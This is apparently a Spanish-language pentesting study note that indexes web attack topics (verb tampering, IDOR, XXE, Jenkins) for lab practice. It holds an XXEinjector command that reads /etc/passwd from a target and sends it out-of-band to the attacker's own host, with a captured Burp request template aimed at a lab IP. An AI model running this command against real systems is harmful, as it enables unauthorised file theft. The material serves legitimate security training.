# Other Web Attacks (HTTP verb Tampering, IDOR & XXE)

- [HTTP verb tampering](./http-verb-tampering.md)
- [IDOR (Insecure Direct Object Reference)](./idor.md)
- [XXE (XML External Entity)](./xxe.md)
- [Attacking Jenkins](./attacking-jenkins.md)
- Podemos utilizar [XXEinjector](https://github.com/enjoiz/XXEinjector) para automatizar el proceso de inyección de XML externa.
- `ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter` Nos tenemos que guardar la petición HTTP de burp
```
POST /blind/submitDetails.php HTTP/1.1

Host: 10.129.197.101

Content-Length: 140

Accept-Language: en-US,en;q=0.9

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36

Content-Type: text/plain;charset=UTF-8

Accept: */*

Origin: http://10.129.197.101

Referer: http://10.129.197.101/

Accept-Encoding: gzip, deflate, br

Connection: keep-alive



<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT```